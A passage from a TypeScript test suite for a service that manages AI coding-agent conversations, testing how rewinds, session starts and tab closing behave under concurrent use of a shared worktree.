      await expect(service.previewRewind(chat.id, messageId)).rejects.toMatchObject({
        code: 'rewindBusy'
      })
      expect(agent().rewinds()).toEqual([])
    })

    // Three conversations share a worktree, and a rewind restores whatever this
    // one's checkpoint tracked — which can be a file another is editing.
    it('refuses while another conversation of the workspace is working', async () => {
      const { service, workspaceId, chatId, messageId } = await spoken()
      const other = await service.createChat(workspaceId)
      await service.sendToChat(other.id, 'keep editing')
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId).find((chat) => chat.id === other.id)?.status).toBe(
          'running'
        )
      })

      for (const scope of ['files', 'both'] as const) {
        await expect(service.rewindChat(chatId, messageId, scope)).rejects.toMatchObject({
          code: 'rewindBusy'
        })
      }
      // The preview says the files cannot be asked about rather than refusing:
      // the conversation still can be.
      await expect(service.previewRewind(chatId, messageId)).resolves.toEqual({
        conversation: true,
        files: null
      })
    })

    // Its own history is not shared: only the files are.
    it('rewinds the conversation while another of the workspace is working', async () => {
      const { service, workspaceId, chatId, messageId } = await spoken()
      const other = await service.createChat(workspaceId)
      await service.sendToChat(other.id, 'keep editing')

      await expect(service.rewindChat(chatId, messageId, 'conversation')).resolves.toMatchObject({
        files: null,
        text: 'rename the helper'
      })
    })

    /*
     * The branch that makes a second asker wait for the first start, reached the
     * plain way: two messages into one conversation before its session exists.
     * It used to be covered only by the race below, whose outcome depends on how
     * long a settings read happens to take — green on one machine and a missed
     * branch on another, with nothing in the change under test to blame.
     */
    it('starts one session when two messages arrive before it exists', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await Promise.all([service.sendToChat(chat.id, 'one'), service.sendToChat(chat.id, 'two')])

      expect(agents).toHaveLength(1)
    })

    // A message sent while the session for a rewind is being started began a
    // turn the rewind would otherwise have run underneath — and both reaching
    // for a session started two, the second registered over the first.
    it('starts one session when a message and a rewind both need one', async () => {
      const { service, chatId, messageId } = await spoken()
      await service.closeChats()
      const before = agents.length

      const outcomes = await Promise.allSettled([
        service.previewRewind(chatId, messageId),
        service.sendToChat(chatId, 'and another thing')
      ])

      expect(agents.length).toBe(before + 1)
      // One of them won; the preview either ran first or was refused.
      expect(outcomes[1].status).toBe('fulfilled')
    })

    // A rewind starts a session from the record as it was when it began, and
    // what the user changes while that start is under way went to a session not
    // yet registered — so it reached nothing. The session is built from the
    // record as it is by the time it is registered.
    it('starts a session in the mode the record names by then', async () => {
      const { service, workspaceId, chatId, messageId } = await spoken()
      await service.closeChats()
      const before = agents.length

      await service.setChatPlanMode(chatId, false)
      const previewing = service.previewRewind(chatId, messageId)
      await service.setChatWorkingMode(chatId, 'acceptEdits')
      await previewing

      // Whichever way the race fell, the session ends up in the mode the record
      // names: built with it, or told it once registered. What must not happen
      // is the third outcome, where it was built from the snapshot and the
      // change went nowhere. Whether the race lands in that window is down to
      // timing, so with the fix reverted this fails often rather than always.
      const started = agents[before]
      const built = started?.options().permissionMode === 'acceptEdits'
      const told = started?.modes().includes('acceptEdits') === true
      expect(built || told).toBe(true)
      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('acceptEdits')
    })

    // The files a link sat on were left alone, and the log must not read as
    // though everything the checkpoint tracked had come back.
    it('records how many files a link kept it from restoring', async () => {
      const { service, chatId, messageId } = await spoken()
      rewindAnswer = () =>
        Promise.resolve({
          canRewind: true,
          filesChanged: ['a.ts'],
          insertions: 1,
          deletions: 0,
          skippedLinks: 2
        })

      await service.rewindChat(chatId, messageId, 'files')

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chatId)
        expect(history.at(-1)).toMatchObject({
          event: { type: 'files_rewound', files: 1, skippedLinks: 2 }
        })
      })
    })

    // `/usage` is answered here and never reaches the agent, so a rewind mark on
    // it would be a promise nothing could keep.
    it('gives a command the agent never sees no id to rewind to', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      const answered = await service.sendToChat(chat.id, '/usage')

      const [entry] = await service.chatHistory(chat.id)
      expect(entry).toMatchObject({ role: 'user', text: '/usage' })
      expect(entry).not.toHaveProperty('uuid')
      expect(answered).toBeNull()
    })

    // The id comes from the window, and the agent will rewind to any it has
    // heard of — so it has to be one this conversation recorded.
    it('refuses a message this conversation never sent', async () => {
      const { service, chatId } = await spoken()

      await expect(
        service.rewindChat(chatId, '00000000-0000-4000-8000-000000000000', 'both')
      ).rejects.toMatchObject({ name: 'ChatError', code: 'rewindUnavailable' })
      await expect(
        service.previewRewind(chatId, '00000000-0000-4000-8000-000000000000')
      ).rejects.toMatchObject({ code: 'rewindUnavailable' })
      expect(agent().rewinds()).toEqual([])
    })

    it('refuses a conversation that has no session to ask', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'go')
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      const [entry] = await service.chatHistory(chat.id)
      const messageId = entry?.role === 'user' ? (entry.uuid ?? '') : ''

      await expect(service.rewindChat(chat.id, messageId, 'both')).rejects.toMatchObject({
        code: 'rewindUnavailable'
      })
    })

    it('says what the agent said when it cannot', async () => {
      const { service, chatId, messageId } = await spoken()
      rewindAnswer = () =>
        Promise.resolve({ canRewind: false, error: 'No checkpoint for that message' })

      await expect(service.rewindChat(chatId, messageId, 'files')).rejects.toMatchObject({
        code: 'rewindUnavailable',
        params: { reason: 'No checkpoint for that message' }
      })
      // The preview answers with the verdict rather than refusing, so the
      // dialog can say why the files are not on offer.
      await expect(service.previewRewind(chatId, messageId)).resolves.toMatchObject({
        conversation: true,
        files: { canRewind: false, error: 'No checkpoint for that message' }
      })
      const history = await service.chatHistory(chatId)
      expect(
        history.some((entry) => entry.role === 'agent' && entry.event.type === 'files_rewound')
      ).toBe(false)
    })

    it('still refuses when the agent gives no reason', async () => {
      const { service, chatId, messageId } = await spoken()
      rewindAnswer = () => Promise.resolve({ canRewind: false })

      await expect(service.rewindChat(chatId, messageId, 'files')).rejects.toMatchObject({
        code: 'rewindUnavailable',
        params: { reason: '' }
      })
    })

    // Possible long after the turn it undoes: the session is started from the
    // stored id when there is none running.
    it('starts a session for a conversation that has none running', async () => {
      const { service, chatId, messageId } = await spoken()
      await service.closeChats()
      const before = agents.length

      await service.previewRewind(chatId, messageId)

      expect(agents.length).toBe(before + 1)
      expect(agents.at(-1)?.rewinds()).toEqual([{ messageId, dryRun: true }])
    })

    describe('the conversation', () => {
      it('cuts the log back and hands the message back, leaving the files alone', async () => {
        const { service, chatId, second, events } = await spokenTwice()

        await expect(service.rewindChat(chatId, second, 'conversation')).resolves.toEqual({
          files: null,
          text: 'now rename the test too'
        })

        await expect(saidIn(service, chatId)).resolves.toEqual(['rename the helper'])
        expect(agent().rewinds()).toEqual([])
        // Every window holding the log is told to read it again.
        expect(events.map((event) => event.event)).toContainEqual({
          type: 'conversation_rewound',
          messageId: second
        })
      })

      /*
       * The agent forgets from where the next session starts: measured against
       * the real CLI, a session started at the cut and closed unused leaves a
       * plain resume remembering everything. So the cut is kept until a turn
       * runs on it, and the session that was holding the old history goes.
       */
      it('starts the next session at the cut, and forgets it once a turn has run', async () => {
        const { service, workspaceId, chatId, second } = await spokenTwice()

        await service.rewindChat(chatId, second, 'conversation')
        expect(agents[0]?.closed()).toBe(1)
        expect(service.listChats(workspaceId)[0]).toMatchObject({
          sessionId: 'sess-1',
          resumeAt: 'answer-1'
        })

        await service.sendToChat(chatId, 'rename the test, carefully')
        expect(agents[1]?.options()).toMatchObject({
          resume: 'sess-1',
          resumeSessionAt: 'answer-1'
        })

        agents[1]?.emit(resultMessage)
        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.resumeAt).toBeNull()
        })
      })

      // Applied by the next session whenever it comes, which may be after a
      // restart: the record carries it.
      it('keeps the cut across a restart until it is used', async () => {
        const { service, workspaceId, chatId, second } = await spokenTwice()
        await service.rewindChat(chatId, second, 'conversation')

        const reopened = await createService({ ...paths(dir), query: fakeQuery() })

        expect(reopened.listChats(workspaceId)[0]?.resumeAt).toBe('answer-1')
      })

      // A session started at one cut, outlived by a second rewind, must not
      // clear the second cut when it finally finishes something.
      it('is not forgotten by a session that started at another cut', async () => {
        const { service, workspaceId, chatId, first, second, events } = await spokenTwice()
        await service.sendToChat(chatId, 'and the docs')
        agent().emit(resultMessage)
        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
        })
        const third = (await service.chatHistory(chatId))
          .flatMap((entry) => (entry.role === 'user' ? [entry.uuid ?? ''] : []))
          .at(-1)
        sessionChain = () => Promise.resolve(chainOf(first, second, third ?? ''))

        await service.rewindChat(chatId, third ?? '', 'conversation')
        // Started at that cut, by asking what a rewind would do.
        await service.previewRewind(chatId, second)
        const atThatCut = agents.at(-1)
        expect(atThatCut?.options()).toMatchObject({ resumeSessionAt: 'answer-2' })

        await service.rewindChat(chatId, second, 'conversation')
        // A closed session can still hand over what it had buffered.
        const results = events.filter((event) => event.event.type === 'result').length
        atThatCut?.emit(resultMessage)
        await vi.waitFor(() => {
          expect(events.filter((event) => event.event.type === 'result')).toHaveLength(results + 1)
        })
        // Commits run in order, so once this one has, the result's has too.
        await service.renameChat(chatId, 'settled')

        expect(service.listChats(workspaceId)[0]?.resumeAt).toBe('answer-1')
      })

      it('forgets a cut that belonged to a session since replaced', async () => {
        const { service, workspaceId, chatId, second } = await spokenTwice()
        await service.rewindChat(chatId, second, 'conversation')

        await service.sendToChat(chatId, 'start over')
        agents.at(-1)?.emit({ ...initMessage, session_id: 'sess-2' })

        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]).toMatchObject({
            sessionId: 'sess-2',
            resumeAt: null
          })
        })
      })

      // Nothing precedes it, so there is nothing to keep: a new session.
      it('starts over when the message opened the conversation', async () => {
        const { service, workspaceId, chatId, first } = await spokenTwice()

        await expect(service.rewindChat(chatId, first, 'conversation')).resolves.toMatchObject({
          text: 'rename the helper'
        })

        await expect(service.chatHistory(chatId)).resolves.toEqual([])
        expect(service.listChats(workspaceId)[0]).toMatchObject({
          sessionId: null,
          resumeAt: null
        })
        await service.sendToChat(chatId, 'from scratch')
        expect(agents.at(-1)?.options()).not.toHaveProperty('resume')
      })

      // The fork copies the agent's session as it is on disk, which still
      // runs to the end until a turn lands on the cut.
      it('cuts a fork where it is waiting to be cut', async () => {
        const { service, chatId, second } = await spokenTwice()
        await service.forkChat(chatId)
        await service.rewindChat(chatId, second, 'conversation')

        await service.forkChat(chatId)

        expect(forks).toEqual([
          { sessionId: 'sess-1', upToMessageId: undefined },
          { sessionId: 'sess-1', upToMessageId: 'answer-1' }
        ])
      })

      // Compacted away, or renamed by a fork: offered as unavailable, and
      // refused without touching anything.
      it('is not offered for a message the session no longer holds', async () => {
        const { service, workspaceId, chatId, second } = await spokenTwice()
        sessionChain = () => Promise.resolve(chainOf('someone-else'))
        const before = await service.chatHistory(chatId)

        await expect(service.previewRewind(chatId, second)).resolves.toMatchObject({
          conversation: false
        })
        await expect(service.rewindChat(chatId, second, 'both')).rejects.toMatchObject({
          code: 'rewindUnavailable'
        })

        await expect(service.chatHistory(chatId)).resolves.toEqual(before)
        expect(agent().rewinds()).toEqual([{ messageId: second, dryRun: true }])
        expect(service.listChats(workspaceId)[0]?.resumeAt).toBeNull()
      })

      it('is not offered when the session’s history cannot be read', async () => {
        const { service, chatId, second } = await spokenTwice()
        sessionChain = () => Promise.reject(new Error('no such session'))

        await expect(service.previewRewind(chatId, second)).resolves.toMatchObject({
          conversation: false
        })
      })

      // The files go first, and a refusal there leaves the conversation as it
      // was — nothing about the rewind happened.
      it('stays whole when the files cannot be put back', async () => {
        const { service, workspaceId, chatId, second } = await spokenTwice()
        rewindAnswer = () => Promise.resolve({ canRewind: false, error: 'No checkpoint' })

        await expect(service.rewindChat(chatId, second, 'both')).rejects.toMatchObject({
          code: 'rewindUnavailable'
        })

        await expect(saidIn(service, chatId)).resolves.toHaveLength(2)
        expect(service.listChats(workspaceId)[0]?.resumeAt).toBeNull()
      })

      // Nothing was sent on top of the cut yet, so putting the record back
      // makes the failure exact.
      it('puts the record back when the log cannot be cut', async () => {
        const { service, workspaceId, chatId, second } = await spokenTwice()
        await mkdir(`${chatTranscript(chatId, join(dir, 'data'))}.tmp`, { recursive: true })
        await writeFile(
          join(`${chatTranscript(chatId, join(dir, 'data'))}.tmp`, 'blocker'),
          '',
          'utf8'
        )

        await expect(service.rewindChat(chatId, second, 'conversation')).rejects.toThrow()

        expect(service.listChats(workspaceId)[0]).toMatchObject({
          sessionId: 'sess-1',
          resumeAt: null
        })
        await expect(saidIn(service, chatId)).resolves.toHaveLength(2)
      })
    })

    describe('both halves', () => {
      it('puts the files back first, and keeps the row that says so', async () => {
        const { service, chatId, second } = await spokenTwice()
        const asked: string[] = []
        const answer = rewindAnswer
        rewindAnswer = () => {
          asked.push(agents[0]?.closed() === 0 ? 'files while alive' : 'files after close')
          return answer()
        }

        await expect(service.rewindChat(chatId, second, 'both')).resolves.toMatchObject({
          files: { filesChanged: ['a.ts', 'b.ts'] },
          text: 'now rename the test too'
        })

        expect(asked).toEqual(['files while alive'])
        // Written after the cut, or the cut would have taken it.
        const history = await service.chatHistory(chatId)
        expect(
          history.map((entry) => (entry.role === 'user' ? entry.text : entry.event.type))
        ).toEqual(['rename the helper', 'session_started', 'result', 'files_rewound'])
      })

      /*
       * Windows read the log again the moment they hear the conversation was
       * cut. The row about the files is written just before, and a read that
       * overtook its write drew a log without it — read here at that same
       * moment, as a window would.
       */
      it('has the row about the files on disk by the time windows read again', async () => {
        const { service, chatId, second, events } = await spokenTwice()
        const reads: Promise<ChatEntry[]>[] = []
        const push = events.push.bind(events)
        events.push = (...added: ChatEvent[]): number => {
          for (const one of added) {
            if (one.event.type === 'conversation_rewound') reads.push(service.chatHistory(chatId))
          }
          return push(...added)
        }

        await service.rewindChat(chatId, second, 'both')

        expect(reads).toHaveLength(1)
        const [history] = await Promise.all(reads)
        expect(
          history?.some((entry) => entry.role === 'agent' && entry.event.type === 'files_rewound')
        ).toBe(true)
      })
    })

    describe('a rewind under way', () => {
      /** Holds the session's history back, so the rewind waits mid-way. */
      function holdChain(messages: string[]): { release: () => void } {
        // Made up front rather than when asked for: the rewind reads the chain
        // only after its own checks, which may well be after the test lets go.
        let release: () => void = () => undefined
        const chain = new Promise<unknown>((resolve) => {
          release = () => {
            resolve(chainOf(...messages))
          }
        })
        sessionChain = () => chain
        return { release }
      }

      // A message would land in the history being cut, or start a session on it.
      it('refuses a message, and a second rewind, until it ends', async () => {
        const { service, chatId, first, second } = await spokenTwice()
        const held = holdChain([first, second])

        const rewinding = service.rewindChat(chatId, second, 'conversation')
        await vi.waitFor(async () => {
          await expect(service.sendToChat(chatId, 'too soon')).rejects.toMatchObject({
            code: 'rewindInProgress'
          })
        })
        await expect(service.rewindChat(chatId, first, 'conversation')).rejects.toMatchObject({
          code: 'rewindInProgress'
        })
        await expect(service.askSideQuestion(chatId, 'q', [])).rejects.toMatchObject({
          code: 'rewindInProgress'
        })

        held.release()
        await rewinding
        await service.sendToChat(chatId, 'now')
        await expect(saidIn(service, chatId)).resolves.toEqual(['rename the helper', 'now'])
      })

      // The worktree is shared, so the files are refused if another
      // conversation began working while this one was finding its cut.
      it('asks again whether the workspace is quiet before the files', async () => {
        const { service, workspaceId, chatId, first, second } = await spokenTwice()
        const other = await service.createChat(workspaceId)
        const held = holdChain([first, second])

        const rewinding = service.rewindChat(chatId, second, 'both')
        await service.sendToChat(other.id, 'keep editing')
        held.release()

        await expect(rewinding).rejects.toMatchObject({ code: 'rewindBusy' })
        await expect(saidIn(service, chatId)).resolves.toHaveLength(2)
      })

      // A session started from the old history must not outlive the cut: the
      // rewind closes it, so the next one starts at the cut. Ordered by hand —
      // the rewind reads its cut only once the preview's session is up — since
      // left to timing this passed locally and failed on a slower machine.
      it('closes a session started from the old history', async () => {
        const { service, chatId, first, second } = await spokenTwice()
        await service.closeChats()
        const before = agents.length
        // Held in an object: assigned inside the closure, which narrowing cannot see.
        const preview: { running: Promise<unknown> | null } = { running: null }
        sessionChain = async () => {
          // The rewind's own read: start the preview, and wait for its session.
          if (preview.running === null) {
            preview.running = service.previewRewind(chatId, first)
            await vi.waitFor(() => {
              expect(agents.length).toBe(before + 1)
            })
          }
          return chainOf(first, second)
        }

        await service.rewindChat(chatId, second, 'conversation')
        await preview.running

        expect(agents.length).toBe(before + 1)
        expect(agents.at(-1)?.closed()).toBe(1)
      })
    })
  })

  describe('closing a conversation', () => {
    /** A session start held at its last await until the test lets it go. */
    function heldStart(): {
      windowOverride: () => Promise<null>
      asked: () => boolean
      release: () => void
    } {
      let release: () => void = () => undefined
      let asked = false
      const held = new Promise<null>((resolve) => {
        release = () => {
          resolve(null)
        }
      })
      return {
        windowOverride: () => {
          asked = true
          return held
        },
        asked: () => asked,
        release
      }
    }

    // A click that was a slip used to cost the whole conversation. Closing a
    // tab ends its session and takes it out of the strip, and keeps the rest.
    it('ends the session, keeps the history and takes the tab out of the strip', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)

      await service.sendToChat(first.id, 'go')
      await service.closeChat(first.id)

      expect(agent().closed()).toBe(1)
      await expect(service.chatHistory(first.id)).resolves.toMatchObject([
        { role: 'user', text: 'go' }
      ])
      expect(service.listChats(workspaceId).map((chat) => chat.id)).toEqual([second.id])
      const closed = await service.listClosedChats(workspaceId)
      expect(closed.map(({ chat }) => chat.id)).toEqual([first.id])
      // What it is recognised by in the history list: the opening message.
      expect(closed[0]?.preview).toBe('go')
    })

    // Closed mid-turn, the record must not come back claiming to be working.
    it('puts a running conversation down to idle when it is closed', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'go')

      await service.closeChat(first.id)

      const [closed] = await service.listClosedChats(workspaceId)
      expect(closed?.chat.status).toBe('idle')
    })

    // A window that has not heard it was closed still shows the tab. Sending
    // would start a session no tab and no status shows, editing the worktree.
    it('refuses a message to a closed conversation, and a rewind', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.closeChat(first.id)

      await expect(service.sendToChat(first.id, 'still there?')).rejects.toMatchObject({
        name: 'ChatError',
        code: 'chatClosed'
      })
      await expect(
        service.rewindChat(first.id, '00000000-0000-4000-8000-000000000000', 'both')
      ).rejects.toMatchObject({ code: 'chatClosed' })
      expect(agents).toHaveLength(0)
    })

    /*
     * A message sent and the tab closed at once: the send's session was still
     * starting, so the close found nothing to end, and the start then
     * registered a session on a closed conversation — one nothing would ever
     * end, since removing the workspace walks the open ones only. Held until
     * the close has been written, the start reads it and refuses.
     */
    it('refuses to start a session on a conversation closed while it started', async () => {
      const start = heldStart()
      const { service, workspaceId } = await withWorkspace({
        windowOverride: start.windowOverride
      })
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      const sent = service.sendToChat(first.id, 'go')
      await vi.waitFor(() => {
        expect(start.asked()).toBe(true)
      })

      await service.closeChat(first.id)
      start.release()

      await expect(sent).rejects.toMatchObject({ code: 'chatClosed' })
      expect(agents).toHaveLength(0)
    })

    /*
     * The other way the race falls: let go as the close begins, the start reads
     * the record before the close is written and registers. The close is
     * written before the session is ended, so that session is there to be
     * ended — and the send's `running`, queued behind the close, must not
     * land on the closed record.
     *
     * With git slower than the close, as it was on CI: a git read still running
     * after the start is let go would let the close be written first.
     */
    it('ends a session that registered while the close was being written', async () => {
      const start = heldStart()
      const { service, workspaceId } = await withWorkspace({
        windowOverride: start.windowOverride,
        makeExec: (cwd, options) => {
          const exec = gitIn(cwd, options)
          return async (args) => {
            if (args[0] === 'config' && args[1] === '--get-regexp') {
              await new Promise((resolve) => setTimeout(resolve, 200))
            }
            return exec(args)
          }
        }
      })
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      const sent = service.sendToChat(first.id, 'go')
      await vi.waitFor(() => {
        expect(start.asked()).toBe(true)
      })

      const closing = service.closeChat(first.id)
      start.release()
      await closing

      await expect(sent).resolves.toEqual(expect.any(String))
      expect(agents).toHaveLength(1)
      expect(agent().closed()).toBe(1)
      const [closed] = await service.listClosedChats(workspaceId)
      expect(closed?.chat.status).toBe('idle')
      await expect(service.sessionUsage(first.id)).resolves.toEqual({
        context: null,
        autoCompact: null
      })
    })

    /*
     * A `/clear` to a live session, and the tab closed while its mode was being
     * set: the close emptied the clear requests, and one marked after it waited
     * for a reset that would never come — so on the reopened tab the next reset
     * the agent sent of its own accord was read as the clear.
     */
    it('strands no clear request when the tab closes while the message waits', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      let release: () => void = () => undefined
      let asked = false
      modeAnswer = () => {
        asked = true
        return new Promise<void>((resolve) => {
          release = resolve
        })
      }
      const sent = service.sendToChat(first.id, '/clear')
      await vi.waitFor(() => {
        expect(asked).toBe(true)
      })
      await service.closeChat(first.id)
      modeAnswer = () => Promise.resolve()
      release()
      await sent

      await service.reopenChat(first.id)
      await service.sendToChat(first.id, 'carry on')
      agents.at(-1)?.emit({
        type: 'conversation_reset',
        new_conversation_id: 'conv-2',
        session_id: 'sess-1'
      } as unknown as SDKMessage)

      await vi.waitFor(() => {
        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'conversation_reset',
          cleared: false
        })
      })
    })

    // The session that has just ended may still say something. It must not
    // leave the record `error`, red on the day it is reopened.
    it('keeps a closed conversation idle when its session speaks late', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'go')
      await service.closeChat(first.id)
      const heard: ChatStatusEvent[] = []
      service.onChatStatus((event) => heard.push(event))

      agent().emit(abortedResultMessage)
      // A write queued after the late one, so it has landed by the time this has.
      await new Promise((resolve) => setTimeout(resolve, 0))
      await service.renameChat(second.id, 'barrier')

      const [closed] = await service.listClosedChats(workspaceId)
      expect(closed?.chat.status).toBe('idle')
      // Nor is the window told it went red: the dot would be drawn that way.
      expect(heard).toEqual([])
    })

    // The record is closed before the session is, so the session can still be
    // speaking while that write is on its way.
    it('keeps a closed conversation idle when its session speaks as it closes', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'go')

      const closing = service.closeChat(first.id)
      agent().emit(abortedResultMessage)
      await closing
      await new Promise((resolve) => setTimeout(resolve, 0))
      await service.renameChat(second.id, 'barrier')

      const [closed] = await service.listClosedChats(workspaceId)
      expect(closed?.chat.status).toBe('idle')
    })

    it('lists the most recently closed first', async () => {
      let clock = '2026-08-20T10:00:00.000Z'
      const { service, workspaceId } = await withWorkspace({ now: () => clock })
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.createChat(workspaceId)

      await service.closeChat(first.id)
      clock = '2026-08-20T11:00:00.000Z'
      await service.closeChat(second.id)

      const closed = await service.listClosedChats(workspaceId)
      expect(closed.map(({ chat }) => chat.id)).toEqual([second.id, first.id])
      expect(closed.map(({ closedAt }) => closedAt)).toEqual([
        '2026-08-20T11:00:00.000Z',
        '2026-08-20T10:00:00.000Z'
      ])
    })

    it('reopens a closed conversation with its history and its session', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'go')
      await service.closeChat(first.id)

      const reopened = await service.reopenChat(first.id)

      expect(reopened.closedAt).toBeNull()
      expect(service.listChats(workspaceId).map((chat) => chat.id)).toContain(first.id)
      await expect(service.listClosedChats(workspaceId)).resolves.toEqual([])
      await expect(service.chatHistory(first.id)).resolves.toMatchObject([
        { role: 'user', text: 'go' }
      ])
    })

    // The cap counts tabs, and a conversation coming back is one more.
    it('refuses to reopen into a full workspace', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.createChat(workspaceId)
      await service.closeChat(first.id)
      await service.createChat(workspaceId)

      await expect(service.reopenChat(first.id)).rejects.toMatchObject({
        name: 'ChatError',
        code: 'tooManyChats'
      })
      await expect(service.listClosedChats(workspaceId)).resolves.toHaveLength(1)
    })

    it('answers with the conversation itself when it is already open', async () => {
      const { service, workspaceId } = await withWorkspace()
      const only = await service.openChat(workspaceId)

      await expect(service.reopenChat(only.id)).resolves.toMatchObject({ id: only.id })
    })

    // A record and a transcript per closed tab, for ever, would be a leak of
    // its own. The oldest go once the limit is passed — records and files both.
    it('discards the oldest closed conversations past the keep limit', async () => {
      const { service, workspaceId } = await withWorkspace()
      const oldest = await service.openChat(workspaceId)
      await service.sendToChat(oldest.id, 'the first one')

      let previous = oldest
      for (let closed = 0; closed <= MAX_CLOSED_CHATS_PER_WORKSPACE; closed += 1) {
        const next = await service.createChat(workspaceId)
        await service.closeChat(previous.id)
        previous = next
      }

      const kept = await service.listClosedChats(workspaceId)
      expect(kept).toHaveLength(MAX_CLOSED_CHATS_PER_WORKSPACE)
      expect(kept.map(({ chat }) => chat.id)).not.toContain(oldest.id)
      await expect(service.chatHistory(oldest.id)).resolves.toEqual([])
    })

    // History is the workspace's, and goes with it — the closed ones included,
    // which `chatsOfWorkspace` no longer reaches.
    it('discards the closed conversations with their project', async () => {
      const { service, workspaceId, projectId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'go')
      await service.closeChat(first.id)

      await service.removeProjectById(projectId)

      await expect(service.chatHistory(first.id)).resolves.toEqual([])
    })

    it('discards the closed conversations with their workspace', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'go')
      await service.closeChat(first.id)

      await service.removeWorkspaceById(workspaceId, { force: true })

      await expect(service.chatHistory(first.id)).resolves.toEqual([])
      await expect(service.listClosedChats(workspaceId)).resolves.toEqual([])
    })

    it('leaves the other conversations’ history alone', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)

      await service.sendToChat(first.id, 'first')
      await service.sendToChat(second.id, 'second')
      await service.closeChat(first.id)

      await expect(service.chatHistory(second.id)).resolves.toMatchObject([
        { role: 'user', text: 'second' }
      ])
    })

    // Only this conversation's. The maps are the whole service's, and a
    // question belonging to a conversation still open must survive.
    it('abandons only its own questions', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)

      await service.sendToChat(first.id, 'first')
      await service.sendToChat(second.id, 'second')

      const [firstAgent, secondAgent] = agents
      void firstAgent?.ask('Bash', { command: 'ls' })
      void secondAgent?.ask('Bash', { command: 'pwd' })
      await waitForRequest(events)

      await service.closeChat(first.id)

      expect(service.pendingPermissions(second.id)).toHaveLength(1)
    })

    it('brings the workspace back to idle when the one running goes', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'go')

      const workspaces: WorkspaceStatusEvent[] = []
      service.onWorkspaceStatus((event) => workspaces.push(event))

      await service.closeChat(first.id)

      expect(workspaces).toEqual([{ workspaceId, status: 'idle' }])
    })

    /*
     * Throwing away the only conversation is `/clear`, which does it without
     * leaving the pane with nothing to draw. Two ways to do one thing, and one
     * of them destroying a file without the confirmation the other carries.
     */
    it('refuses the last one of a workspace', async () => {
      const { service, workspaceId } = await withWorkspace()
      const only = await service.openChat(workspaceId)

      await expect(service.closeChat(only.id)).rejects.toMatchObject({
        name: 'ChatError',
        code: 'lastChat'
      })
      expect(service.listChats(workspaceId)).toHaveLength(1)
    })

    // Decided inside the commit: two closes of the last two tabs each saw the
    // other still open, and the workspace was left with none.
    it('keeps one conversation open when the last two close at once', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)

      const [closedFirst, closedSecond] = await Promise.allSettled([
        service.closeChat(first.id),
        service.closeChat(second.id)
      ])

      expect(closedFirst.status).toBe('fulfilled')
      expect(closedSecond).toMatchObject({ status: 'rejected', reason: { code: 'lastChat' } })
      expect(service.listChats(workspaceId)).toHaveLength(1)
    })

    // And the one refused keeps its session: it is still a tab, mid-turn.
    it('leaves the session of the one it refuses running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'one')
      await service.sendToChat(second.id, 'two')

      await Promise.allSettled([service.closeChat(first.id), service.closeChat(second.id)])

      expect(agents.map((one) => one.closed())).toEqual([1, 0])
    })

    // Two windows closing the same tab: the close they asked for happened.
    it('closes the same conversation asked for twice at once', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.createChat(workspaceId)

      await expect(
        Promise.all([service.closeChat(first.id), service.closeChat(first.id)])
      ).resolves.toEqual([undefined, undefined])
      expect(service.listChats(workspaceId)).toHaveLength(1)
    })

    it('refuses an id nothing answers to', async () => {
      const { service } = await withWorkspace()

      await expect(service.closeChat('chat-nowhere')).rejects.toBeInstanceOf(WorkspaceError)
    })
  })

  describe('a conversation continuing another', () => {
    /** The SDK's own fork, injected like `query` so no CLI is reached. */
    function forkingService(
